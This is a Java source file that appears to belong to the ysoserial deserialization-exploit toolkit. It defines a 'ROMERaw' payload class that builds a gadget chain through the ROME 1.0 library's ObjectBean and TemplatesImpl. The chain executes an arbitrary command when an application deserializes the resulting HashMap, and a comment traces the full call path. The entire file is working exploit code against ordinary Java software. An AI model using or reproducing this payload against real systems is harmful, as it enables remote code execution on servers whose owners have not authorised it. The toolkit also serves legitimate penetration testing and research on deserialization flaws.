package ysoserial.payloads;


import com.sun.syndication.feed.impl.ObjectBean;
import ysoserial.blind.GadgetUtils;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;

/**
 * 
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])  
 * NativeMethodAccessorImpl.invoke(Object, Object[])  
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])  
 * Method.invoke(Object, Object...)  
 * ToStringBean.toString(String) 
 * ToStringBean.toString()   
 * ObjectBean.toString() 
 * EqualsBean.beanHashCode() 
 * ObjectBean.hashCode() 
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * 
 * @author mbechler
 *
 */
@Dependencies("rome:rome:1.0")
public class ROMERaw implements ObjectPayloadRaw<Object> {

    public Object getObject ( Object command ) throws Exception {
        Object o = GadgetUtils.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }

}
